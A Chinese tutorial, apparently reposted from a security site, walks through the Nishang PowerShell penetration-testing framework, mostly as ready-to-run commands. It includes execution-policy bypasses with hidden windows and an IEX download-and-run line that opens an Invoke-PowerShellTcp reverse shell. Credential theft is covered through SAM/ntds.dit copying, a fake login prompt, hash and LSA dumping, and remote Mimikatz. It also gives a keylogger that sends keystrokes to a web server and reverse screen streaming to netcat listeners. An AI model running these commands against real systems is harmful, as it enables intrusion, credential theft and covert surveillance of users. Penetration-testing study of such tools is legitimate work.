# 【技术分享】Powershell 渗透测试工具-Nishang（二）
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
**作者：**[ **V1ct0r**](http://bobao.360.cn/member/contribute?uid=2665001095)
**稿费：500RMB（不服你也来投稿啊！）**
**投稿方式：发送邮件至linwei#360.cn，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿**
**传送门**
[**【技术分享】Powershell 渗透测试工具-Nishang（一）**](http://bobao.360.cn/learning/detail/3182.html)
**  
**
**0x00 介绍**
Powershell用于渗透测试其实早在多年前就已经被提出了。利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被大家广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。Nishang是基于PowerShell的渗透测试专用工具。它集成了框架、脚本和各种payload，能够帮助渗透测试人员在对Windows目标的全过程检测中使用，是一款来源于作者实战经历的智慧结晶。至今，Nishang最新版本已为v0.67了。本文我将具体介绍这款实用的Powershell渗透测试工具。
**0x01 使用**
要使用Nishang，我们首先需要在[[作者的Github]](https://github.com/samratashok/nishang)上面下载它，之后加载这些脚本。
Nishang需要我们的Powershell版本在v3以上才能使用，这里顺便提供两种查看当前我们当前Powershell版本的方法:
**1.直接在我们的Powershell下执行”get-host”命令：**
**2.我们还可以在Powershell下执行”$PSVersionTable.PSVersion”：**
需要知道的是：
    默认情况下的Server OS 对应的 Powershell的版本：
    Windows 2008 R2   -   Version 2
    Windows 2012      -   Version 3
    Windows 2012 R2   -   Version 4
    Windows 2016      -   Version 5
现在我们需要加载我们的脚本：
    PS D:nishang-master> Import-Module .nishang.psm1
你可能会遇到下面的问题：
这是因为我们Powershell的默认的执行策略是Restricted的，而Restricted是不允许任何脚本运行的，我们可以使用下面的命令来来查看当前的执行策略：
    PS D:nishang-master> Get-ExecutionPolicy
这里我们需要将执行模式改为RemoteSigned，这样就可以执行其他用户的脚本了：
    PS D:nishang-master> set-executionpolicy remotesigned //这需要在管理员的状态下执行
现在，我们就可以正常进行加载了。
当然，上面是基于我们在本地进行测试的情况下，如果是在真实的攻击场景之下，我们还是不宜去做一些全局策略的更改的，这里简单推荐几个Bypass执行策略的Tricks：
    0. Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted //设置当前用户的执行策略为Unrestricted，也算是去更改了当前的全局策略
    1. powershell.exe -executionpolicy bypass -Windowstyle hidden -noninteractive -nologo -File //或是下面这种，-Windowstyle hidden 可以让我们的执行无任何弹窗
    2. PowerShell.exe -ExecutionPolicy Bypass -File
想了解更多姿势，大家可以看看Bypass执行策略的十五种方法：
然后，我们使用Dot Sourcing的方式来加载独立的脚本：
    PS D:nishang-master> ."D:nishang-masterGatherGet-Information.ps1"
在之后的使用中，我们可以使用”Get-Help”命令来获取当前脚本的用法和说明等，如：
    PS D:nishang-master> ."D:nishang-masterGatherGet-WLAN-Keys.ps1
    PS D:nishang-master> Get-Help Get-Wlan-Keys
还需要说的一点是，我们可以在Powershell中使用” Out-File”来将我们的执行结果导出到文件中，如：
    PS D:nishang-master> Get-Information | Out-File res.txt
就可以把获取到的信息保存在res.txt中了。
最后，需要介绍两种在内存当中去加载脚本的方式
第一种：
    powershell iex (New-Object Net.WebClient).DownloadString('http:///Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] //
这里IEX可以远程下载我们的脚本
第二种，我们可以在Powershell中使用Invoke-Encode脚本来将我们现有的脚本编码压缩，生成编码后的内容，过程如下：
    PS D:nishang-master> Invoke-Encode -DataToEncode "D:nishang-masterShellsInvoke-PowerShellTcp.ps1" -OutCommand
    Encoded data written to .encoded.txt
    Encoded command written to .encodedcommand.txt
在我们的encodedcommand.txt文件中我们可以看到编码后的内容和效果：
然后在目标上(Web shell,meterpreter native shell等都可以)使用如下命令执行：
    C:Userstarget> powershell -e [encodedscript]
这里涉及到的Invoke-PowerShellTcp脚本，我们将在后文对于具体模块的脚本介绍时谈到。
**0x02 模块介绍**
**0.信息搜集**
Check-VM
从这个脚本的名字就可以看出来，它是用于检测当前的机器是否是一台已知的虚拟机的。它通过检测已知的一些虚拟机的指纹信息（如：Hyper-V, VMWare,
Virtual PC, Virtual Box,Xen,QEMU）来识别。
执行方式：
    PS > Check-VM
测试
Copy-VSS
这个脚本利用Volume Shadow Copy 服务来复制出SAM文件。如果这个脚本运行在了DC机上ntds.dit和SYSTEM
hive也能被拷贝出来。
执行方式：
    PS > Copy-VSS //将会直接把文件保存在当前路径下
    PS > Copy-VSS -DestinationDir C:temp  //指定保存文件的路径（必须是已经存在的路径）
测试
Invoke-CredentialsPhish
这个脚本是用来欺骗用户输入账号密码信息的。
执行方式：
    PS > Invoke-CredentialsPhish
测试
执行后会弹出这个框欺骗用户输入
直到用户输入正确后这个框才会消失，然后我们就可以得到明文的管理员账号密码：
FireBuster FireListener
FireBuster可以对内网进行扫描，它会把包发给FireListener
执行方式：
    PS > FireBuster 10.10.10.10 1000-1020
    PS > FireListener -portrange 1000-1020
该脚本作者的Github上面还提供了一个Python版的监听端：
测试
我们首先在我们的机器（Attacker）上面运行FireListener：
    FireListener 100-110
Victim：
    FireBuster 192.168.199.1 90-110 -Verbose
Get-Information
这个脚本可以获取目标机器上大量的信息（FTP访问，进程，计算机配置信息，无线网络和设备的信息，Hosts信息等等非超丰富）。
执行方式：
    PS > Get-Information
还可以用我们前面说过的Out-File来将运行结果保存到指定文件。
Get-LSASecret
该脚本可以获取LSA信息，但是使用的前提当然是你已经成功提升了权限的情况下，通常和我们后面提权当中涉及到的Enable-DuplicateToken（帮助我们获得System权限）联合使用。
执行方式：
    PS > Enable-DuplicateToken
    PS > Get-LsaSecret
    PS > Get-LsaSecret -RegistryKey KeyName //还可以指定键名
Get-PassHashes
这个脚本在Administrator的权限下，可以dump出密码哈希值。这个脚本来自于msf中powerdump，但做出了修改，使得我们不再需要System权限就可以dump了。
执行方式：
    PS > Get-PassHashes -PSObjectFormat //可以使用-PSObjectFormat来格式化输出结果
Get-WLAN-Keys
在Administrator的权限下，可以利用这个脚本来dump出WLAN文件的密钥信息。实质上，这个脚本就是利用了netsh wlan show
profile name=”” key=clear来获取。
执行方式：
    PS > Get-WLAN-Keys
Keylogger
Keylogger可以保存下用户的键盘记录。
执行方式：
    PS > .Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis  //-CheckURL参数会去检查所给出的网页之中是否包含 -MagicString后的字符串，如果存在的话就停止使用记录。
    PS > .Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php //将记录指定发送给一个可以记录Post请求的Web服务器
    PS > .Keylogger.ps1 -persist //实现持久化记录（重启后依然进行记录）
    PS > .Keylogger.ps1 //直接以这种方式来运行，键盘记录会保存在当前用户的Temp目录下key文件中
测试
首先执行 PS > .Keylogger.ps1
发现在当前用户的Temp目录下生成了Key的文件，这时我们使用nishang Utility中的Parse_Keys来解析
    PS >Parse_Keys .key.log .parsed.txt
然后parsed.txt里面就是解析后的按键记录了
Invoke-MimikatzWdigestDowngrade
Dump出Windows 8.1 and Server 2012的系统用户密码。
执行方式：
    PS >Invoke-MimikatzWDigestDowngrade
    PS > Get-Job | Receive-Job
执行了
    PS >Invoke-MimikatzWDigestDowngrade
Windows会锁屏
之后执行
    Get-Job
发现尝试多次都测试失败
解决办法可以参考：
[[域渗透——Dump Clear-Text Password after KB2871997
installed]](http://www.myhack58.com/Article/html/3/62/2016/75903.htm)
Get-PassHints
这个脚本可以从Windows获得用户的密码的提示信息，需要有Administrator的权限来读取SAM hive。
执行方式：
    PS > Get-PassHints
Show-TargetScreen
使用MJPEG传输目标机器的远程桌面的实时画面，在本机我们可以使用NC或者Powercat来进行监听。在本地使用支持MJPEG的浏览器（如：Firefox）访问本机对应监听端口，即可在浏览器上面看到远端传输回来的实时画面。
    PS > Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443  //将远程的画面传送到192.168.230.1的443端口
测试
Victim：
    Show-TargetScreen -IPAddres 192.168.199.127 -Port 5773 -Reverse
Attacker：
    nc.exe -nlvp 5773 | nc.exe -nlvp 9000 //这里我使用的NC，也可以用Powercat
本机访问：127.0.0.1:9000
Invoke-Mimikatz
Mimikatz大家都非常熟悉了，就不再介绍了
执行方式：
    Invoke-Mimikatz -DumpCerts //Dump出本机的凭证信息
    Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2") //Dump出远程两台计算机的凭证信息
    Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1" //在远程一台机器上运行Mimikatz并执行"privilege::debug exit"
**1.域相关脚本**
Get-Unconstrained
查找域内开启了Kerberos Unconstrained Delegation的机器。
执行方式：
    PS > Get-Unconstrained //返回开启的计算机名